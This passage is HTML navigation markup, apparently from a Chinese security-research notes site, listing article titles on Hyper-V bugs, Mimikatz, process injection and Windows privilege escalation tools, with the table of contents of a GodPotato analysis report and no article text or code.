+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../hyperV/%E6%96%87%E7%AB%A0%E5%AD%A6%E4%B9%A0/misc/Awesome%20Hyper-V%20Exploitation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    来源
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4_2_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4_2_8" id="__nav_3_4_2_8_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    看雪文章
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_4_2_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4_2_8">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    看雪文章
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4_2_8_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4_2_8_1" id="__nav_3_4_2_8_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    hyper V 漏洞挖掘 0 5
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_3_4_2_8_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4_2_8_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    hyper V 漏洞挖掘 0 5
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../hyperV/%E6%96%87%E7%AB%A0%E5%AD%A6%E4%B9%A0/%E7%9C%8B%E9%9B%AA%E6%96%87%E7%AB%A0/hyper-V%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%200-5/0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    看雪安全社区｜非营利性质的安全技术交流平台
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../hyperV/%E6%96%87%E7%AB%A0%E5%AD%A6%E4%B9%A0/%E7%9C%8B%E9%9B%AA%E6%96%87%E7%AB%A0/hyper-V%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%200-5/1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    看雪安全社区｜非营利性质的安全技术交流平台
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../hyperV/%E6%96%87%E7%AB%A0%E5%AD%A6%E4%B9%A0/%E7%9C%8B%E9%9B%AA%E6%96%87%E7%AB%A0/hyper-V%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%200-5/2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../hyperV/%E6%96%87%E7%AB%A0%E5%AD%A6%E4%B9%A0/%E7%9C%8B%E9%9B%AA%E6%96%87%E7%AB%A0/hyper-V%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%200-5/3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    看雪安全社区｜非营利性质的安全技术交流平台
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../hyperV/%E6%96%87%E7%AB%A0%E5%AD%A6%E4%B9%A0/%E7%9C%8B%E9%9B%AA%E6%96%87%E7%AB%A0/hyper-V%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%200-5/4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    看雪安全社区｜非营利性质的安全技术交流平台
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../hyperV/%E6%96%87%E7%AB%A0%E5%AD%A6%E4%B9%A0/%E7%9C%8B%E9%9B%AA%E6%96%87%E7%AB%A0/hyper-V%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%200-5/5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    看雪安全社区｜非营利性质的安全技术交流平台
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../hyperV/%E6%96%87%E7%AB%A0%E5%AD%A6%E4%B9%A0/%E7%9C%8B%E9%9B%AA%E6%96%87%E7%AB%A0/hyper-V%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%200-5/LLM%E5%88%86%E6%9E%90%201/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    LLM分析 1.md
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../hyperV/%E6%96%87%E7%AB%A0%E5%AD%A6%E4%B9%A0/%E7%9C%8B%E9%9B%AA%E6%96%87%E7%AB%A0/hyper-V%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%200-5/LLM%E5%88%86%E6%9E%90%203/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    LLM分析 3
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../hyperV/%E6%96%87%E7%AB%A0%E5%AD%A6%E4%B9%A0/%E7%9C%8B%E9%9B%AA%E6%96%87%E7%AB%A0/hyper-V%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%200-5/LLM%E5%88%86%E6%9E%90%204/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    LLM分析：Hyper-V安全从0到1(4) - Part 1
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../hyperV/%E6%96%87%E7%AB%A0%E5%AD%A6%E4%B9%A0/%E7%9C%8B%E9%9B%AA%E6%96%87%E7%AB%A0/hyper-V%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%200-5/LLM%E5%88%86%E6%9E%90%205/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    LLM分析 5.md
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../hyperV/%E6%96%87%E7%AB%A0%E5%AD%A6%E4%B9%A0/%E7%9C%8B%E9%9B%AA%E6%96%87%E7%AB%A0/hyper-V%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%200-5/%E9%83%A8%E5%88%86%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hyper-V 学习笔记
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_5" id="__nav_3_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Mimikatz 系列
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Mimikatz 系列
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../mimikatz%20%E7%B3%BB%E5%88%97/1%20internals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    权限和特权
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../mimikatz%20%E7%B3%BB%E5%88%97/2%20lsass/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    LSASS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../mimikatz%20%E7%B3%BB%E5%88%97/3%20kerberos%20%E5%8D%8F%E8%AE%AE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    背景
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../mimikatz%20%E7%B3%BB%E5%88%97/4%20PKI%EF%BC%88%E5%85%AC%E9%92%A5%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%EF%BC%89/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4 PKI（公钥基础设施）
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../mimikatz%20%E7%B3%BB%E5%88%97/5%20DCSync/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    为什么需要
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_6" id="__nav_3_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tips
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Tips
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../tips/loader%20lock%20unlock/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Loader lock unlock
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_7" id="__nav_3_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    反射加载
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    反射加载
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../%E5%8F%8D%E5%B0%84%E5%8A%A0%E8%BD%BD/CLR%20HOSTING/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    常用执行
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../%E5%8F%8D%E5%B0%84%E5%8A%A0%E8%BD%BD/%E5%B0%8F%20case/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    函数指针和 createthread
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../%E5%8F%8D%E5%B0%84%E5%8A%A0%E8%BD%BD/%E6%A3%80%E6%B5%8B%E5%BD%92%E7%BA%B3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CallStack
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_8" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_8" id="__nav_3_8_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    提权
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_8_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_8">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    提权
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_8_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_8_1" id="__nav_3_8_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Doc analysis
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_8_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_8_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Doc analysis
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../summary/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows提权项目汇总分析报告
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_8_1_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_8_1_2" id="__nav_3_8_1_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BadPotato
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_8_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_8_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    BadPotato
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../BadPotato/BadPotato_analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BadPotato 项目分析报告
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_8_1_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_8_1_3" id="__nav_3_8_1_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    GodPotato
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_8_1_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_8_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    GodPotato
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    GodPotato 项目分析报告
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    GodPotato 项目分析报告
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        项目概述
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        功能分析
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="功能分析">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-rpchook" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        功能1: RPC运行时库Hook
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="功能1: RPC运行时库Hook">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        功能目的
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        实现方式
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-rpc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        功能2: 自定义RPC端点解析
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="功能2: 自定义RPC端点解析">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        功能目的
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        实现方式
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-objrefdcom" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        功能3: OBJREF构造与DCOM触发
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="功能3: OBJREF构造与DCOM触发">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        功能目的
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        实现方式
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        功能4: 命名管道服务器
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="功能4: 命名管道服务器">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        功能目的
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        实现方式
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        功能5: 令牌搜索与提升
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="功能5: 令牌搜索与提升">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        功能目的
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        实现方式
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        功能6: 高权限进程创建
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="功能6: 高权限进程创建">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        功能目的
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        实现方式
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        功能组合使用分析
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="功能组合使用分析">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        组合流程
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        组合目的
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        技术学习要点
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="技术学习要点">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-dcomoxid" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. DCOM/OXID解析机制
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-rpc_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. RPC运行时库内部结构
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-windows" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Windows令牌体系
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. 系统句柄枚举技术
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-commoniker" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. COM/Moniker编程
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. 攻击检测与防御
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#potato" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        与其他Potato技术的对比
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_19" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        总结
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_8_1_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_8_1_4" id="__nav_3_8_1_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    UACME
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_8_1_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_8_1_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    UACME
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../UACME/UACME_analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    UACME 项目分析报告
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_9" id="__nav_3_9_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    进程保护
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_9">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    进程保护
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../%E8%BF%9B%E7%A8%8B%E4%BF%9D%E6%8A%A4/CFG%20XFG/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CFG 保护
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../%E8%BF%9B%E7%A8%8B%E4%BF%9D%E6%8A%A4/PPL/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    是什么
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_10" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_10" id="__nav_3_10_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    进程注入
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
